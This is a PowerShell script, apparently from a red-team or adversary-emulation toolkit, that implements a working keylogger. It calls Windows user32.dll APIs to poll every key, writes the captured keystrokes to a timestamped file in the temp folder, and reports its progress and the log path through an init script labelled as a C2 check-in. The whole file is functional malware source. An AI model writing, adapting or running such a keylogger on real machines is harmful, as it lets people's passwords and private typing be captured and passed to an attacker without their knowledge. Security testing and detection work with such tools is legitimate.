#requires -Version 2
#
# keylogger - for logging keystrokes
#
param($duration="120")
$timestamp = Get-Date -Format "yyyyMMddTHHmmss"

# Checkin to C2
& "$PSScriptRoot\init.ps1" -stage keylogger -state starting

function Start-KeyLogger($Path="$env:temp\$timestamp-keylogger.txt") 
{
    & "$PSScriptRoot\init.ps1" -stage keylogger -state started -duration $duration
    $stopwatch =  [system.diagnostics.stopwatch]::StartNew()
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host("Recording key presses. CTRL+C or wait $duration to exit.") -ForegroundColor Red

    # create endless loop. When user presses CTRL+C or $duration expires the finally-block executes
    while ($stopwatch.Elapsed.TotalSeconds -lt $duration) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
    $stopwatch.Stop()
  }
  finally
  {
    & "$PSScriptRoot\init.ps1" -stage keylogger -state complete -comment "Path: $path"
  }
}

# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
Start-KeyLogger